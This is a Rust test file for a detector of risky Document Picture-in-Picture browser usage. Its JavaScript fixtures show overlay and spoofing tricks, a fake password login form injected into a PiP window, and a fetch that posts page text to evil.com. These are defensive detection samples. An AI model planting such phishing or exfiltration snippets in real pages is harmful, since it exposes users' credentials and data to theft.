use super::*;

#[test]
fn no_pip_no_issues() {
    assert!(analyze_document_pip("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_document_pip_api() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::ApiDetected));
}

#[test]
fn detects_uppercase_api() {
    let body = r#"<script>
        if ('DocumentPictureInPicture' in window) { /* supported */ }
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::ApiDetected));
}

#[test]
fn detects_ui_spoofing() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 400, height: 300
        });
        pipWindow.moveTo(100, 100);
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::UiSpoofing));
}

#[test]
fn no_spoofing_without_positioning() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 400, height: 300
        });
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(!issues.contains(&DocumentPipIssue::UiSpoofing));
}

#[test]
fn detects_overlay_attack() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.style.zIndex = "99999";
        pipWindow.document.body.style.opacity = "0.01";
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::OverlayAttack));
}

#[test]
fn no_overlay_without_transparency() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.style.zIndex = "10";
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(!issues.contains(&DocumentPipIssue::OverlayAttack));
}

#[test]
fn detects_content_injection() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = userContent;
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::ContentInjection));
}

#[test]
fn no_injection_with_sanitize() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = sanitize(content);
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(!issues.contains(&DocumentPipIssue::ContentInjection));
}

#[test]
fn detects_persistent_window() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        setInterval(() => { pipWindow.document.title = "Alert!"; }, 1000);
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(issues.contains(&DocumentPipIssue::PersistentWindow));
}

#[test]
fn no_persistent_with_close() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        setInterval(() => { pipWindow.close(); }, 5000);
    </script>"#;
    let issues = analyze_document_pip(body);
    assert!(!issues.contains(&DocumentPipIssue::PersistentWindow));
}

#[test]
fn severity_injection_highest() {
    assert_eq!(
        document_pip_severity(&DocumentPipIssue::ContentInjection),
        7.5
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(document_pip_severity(&DocumentPipIssue::ApiDetected), 2.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![DocumentPipIssue::ApiDetected, DocumentPipIssue::UiSpoofing];
    let mut seq = 0;
    let ops = document_pip_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(DocumentPipIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(DocumentPipIssue::UiSpoofing.to_string(), "ui_spoofing");
    assert_eq!(
        DocumentPipIssue::OverlayAttack.to_string(),
        "overlay_attack"
    );
    assert_eq!(
        DocumentPipIssue::ContentInjection.to_string(),
        "content_injection"
    );
    assert_eq!(
        DocumentPipIssue::PersistentWindow.to_string(),
        "persistent_window"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_document_pip("").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_document_pip_security("").is_empty());
}

#[test]
fn security_no_pip_api_no_issues() {
    let body = r#"<html><body><script>
        const win = window.open();
        win.document.body.innerHTML = "test";
    </script></body></html>"#;
    assert!(analyze_document_pip_security(body).is_empty());
}

#[test]
fn detects_pip_phishing() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = `
            <form action="/login">
                <input type="password" name="pass">
                <button>Login</button>
            </form>
        `;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipPhishing));
}

#[test]
fn detects_pip_phishing_with_single_quotes() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = `
            <form action='/submit'>
                <input type='password' name='pwd'>
            </form>
        `;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipPhishing));
}

#[test]
fn no_phishing_without_password_field() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = `
            <form action="/search">
                <input type="text" name="q">
            </form>
        `;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipPhishing));
}

#[test]
fn detects_pip_data_exfiltration() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const data = pipWindow.document.body.innerText;
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify({data})
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipDataExfiltration));
}

#[test]
fn detects_pip_data_exfiltration_lowercase_post() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        fetch('/api/log', { method: 'POST', body: data });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipDataExfiltration));
}

#[test]
fn no_exfiltration_without_fetch() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerText = "Status";
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipDataExfiltration));
}

#[test]
fn detects_pip_without_user_gesture() {
    let body = r#"<script>
        window.onload = async () => {
            const pipWindow = await documentPictureInPicture.requestWindow();
        };
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_click_handler() {
    let body = r#"<script>
        button.addEventListener('click', async () => {
            const pipWindow = await documentPictureInPicture.requestWindow();
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_keydown() {
    let body = r#"<script>
        document.addEventListener('keydown', async () => {
            const pipWindow = await documentPictureInPicture.requestWindow();
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn detects_pip_cross_origin_content() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = `
            <iframe src="https://external.com/widget"></iframe>
        `;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipCrossOriginContent));
}

#[test]
fn detects_pip_cross_origin_with_http() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const img = pipWindow.document.createElement('img');
        img.src="http://remote.com/image.png";
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipCrossOriginContent));
}

#[test]
fn no_cross_origin_with_same_origin_policy() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.innerHTML = `
            <iframe src="/local/page" same-origin></iframe>
        `;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipCrossOriginContent));
}

#[test]
fn detects_pip_overlay_attack() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.style.position = 'fixed';
        pipWindow.document.body.style.zIndex = '99999';
        pipWindow.document.body.style.pointerEvents = 'none';
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipOverlayAttack));
}

#[test]
fn detects_pip_overlay_with_absolute_position() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.style.cssText = 'position: absolute; z-index: 10000; pointer-events: auto;';
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipOverlayAttack));
}

#[test]
fn no_overlay_without_pointer_events() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.style.zIndex = '100';
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipOverlayAttack));
}

#[test]
fn detects_pip_persistent_window() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        window.addEventListener('beforeunload', () => {
            localStorage.setItem('pipState', JSON.stringify(state));
        });
        setInterval(() => { updatePipContent(); }, 1000);
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipPersistentWindow));
}

#[test]
fn detects_pip_persistent_with_session_storage() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        window.addEventListener('pagehide', () => {
            sessionStorage.setItem('pip', 'active');
        });
        setInterval(checkPip, 500);
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipPersistentWindow));
}

#[test]
fn no_persistent_without_interval() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        window.addEventListener('beforeunload', () => {
            localStorage.setItem('state', 'saved');
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipPersistentWindow));
}

#[test]
fn detects_pip_sensitive_data_display() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const password = document.getElementById('pwd').value;
        pipWindow.document.body.textContent = `Password: ${password}`;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipSensitiveDataDisplay));
}

#[test]
fn detects_pip_sensitive_credit_card() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const card = getCreditCardNumber();
        pipWindow.document.body.innerText = `Card: ${card}`;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipSensitiveDataDisplay));
}

#[test]
fn detects_pip_sensitive_ssn() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const ssn = document.querySelector('[name="ssn"]').value;
        pipWindow.document.body.textContent = ssn;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipSensitiveDataDisplay));
}

#[test]
fn no_sensitive_data_without_keywords() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const username = document.getElementById('user').value;
        pipWindow.document.body.textContent = username;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipSensitiveDataDisplay));
}

#[test]
fn detects_pip_screen_capture() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
        const video = pipWindow.document.createElement('video');
        video.srcObject = stream;
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipScreenCapture));
}

#[test]
fn detects_pip_capture_stream() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const canvas = document.createElement('canvas');
        const stream = canvas.captureStream(30);
        pipWindow.document.body.appendChild(canvas);
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipScreenCapture));
}

#[test]
fn no_screen_capture_without_media_api() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const video = pipWindow.document.createElement('video');
        video.src = '/video.mp4';
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipScreenCapture));
}

#[test]
fn detects_pip_in_background() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                pipWindow.document.body.innerText = 'Still active!';
            }
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipInBackground));
}

#[test]
fn detects_pip_in_background_with_visibility_state() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                updatePip();
            }
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipInBackground));
}

#[test]
fn no_background_issue_with_close() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                pipWindow.close();
            }
        });
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipInBackground));
}

#[test]
fn detects_pip_form_injection() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const form = pipWindow.document.createElement('form');
        form.innerHTML = userInput;
        pipWindow.document.body.appendChild(form);
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipFormInjection));
}

#[test]
fn detects_pip_form_injection_with_adjacent_html() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        pipWindow.document.body.insertAdjacentHTML('beforeend',
            '<form><input name="data"></form>');
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipFormInjection));
}

#[test]
fn no_form_injection_with_sanitize() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const form = pipWindow.document.createElement('form');
        form.innerHTML = sanitize(userInput);
        pipWindow.document.body.appendChild(form);
    </script>"#;
    let issues = analyze_document_pip_security(body);
    assert!(!issues.contains(&DocumentPipSecurityIssue::PipFormInjection));
}

#[test]
fn security_display_all_variants() {
    assert_eq!(
        DocumentPipSecurityIssue::PipPhishing.to_string(),
        "pip_phishing"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipDataExfiltration.to_string(),
        "pip_data_exfiltration"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipWithoutUserGesture.to_string(),
        "pip_without_user_gesture"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipCrossOriginContent.to_string(),
        "pip_cross_origin_content"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipOverlayAttack.to_string(),
        "pip_overlay_attack"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipPersistentWindow.to_string(),
        "pip_persistent_window"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipSensitiveDataDisplay.to_string(),
        "pip_sensitive_data_display"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipScreenCapture.to_string(),
        "pip_screen_capture"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipInBackground.to_string(),
        "pip_in_background"
    );
    assert_eq!(
        DocumentPipSecurityIssue::PipFormInjection.to_string(),
        "pip_form_injection"
    );
}

#[test]
fn security_severity_phishing_highest() {
    assert_eq!(
        document_pip_security_severity(&DocumentPipSecurityIssue::PipPhishing),
        9.0
    );
}

#[test]
fn security_severity_background_lowest() {
    assert_eq!(
        document_pip_security_severity(&DocumentPipSecurityIssue::PipInBackground),
        4.0
    );
}

#[test]
fn security_severity_in_range() {
    let all_variants = vec![
        DocumentPipSecurityIssue::PipPhishing,
        DocumentPipSecurityIssue::PipDataExfiltration,
        DocumentPipSecurityIssue::PipFormInjection,
        DocumentPipSecurityIssue::PipCrossOriginContent,
        DocumentPipSecurityIssue::PipSensitiveDataDisplay,
        DocumentPipSecurityIssue::PipOverlayAttack,
        DocumentPipSecurityIssue::PipScreenCapture,
        DocumentPipSecurityIssue::PipWithoutUserGesture,
        DocumentPipSecurityIssue::PipPersistentWindow,
        DocumentPipSecurityIssue::PipInBackground,
    ];

    for variant in all_variants {
        let severity = document_pip_security_severity(&variant);
        assert!(
            severity >= 3.0 && severity <= 9.0,
            "Severity {} out of range for {:?}",
            severity,
            variant
        );
    }
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        DocumentPipSecurityIssue::PipPhishing,
        DocumentPipSecurityIssue::PipDataExfiltration,
        DocumentPipSecurityIssue::PipFormInjection,
    ];
    let mut seq = 0;
    let ops = document_pip_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
fn security_to_operations_empty_list() {
    let issues = vec![];
    let mut seq = 0;
    let ops = document_pip_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn security_multiple_issues_detected() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();

        // Phishing
        pipWindow.document.body.innerHTML = '<form><input type="password"></form>';

        // Data exfiltration
        fetch('/api', { method: 'POST', body: JSON.stringify({data: 'test'}) });

        // Cross-origin
        pipWindow.document.body.innerHTML += '<iframe src="https://evil.com"></iframe>';
    </script>"#;

    let issues = analyze_document_pip_security(body);
    assert!(issues.len() >= 3);
    assert!(issues.contains(&DocumentPipSecurityIssue::PipPhishing));
    assert!(issues.contains(&DocumentPipSecurityIssue::PipDataExfiltration));
    assert!(issues.contains(&DocumentPipSecurityIssue::PipCrossOriginContent));
}
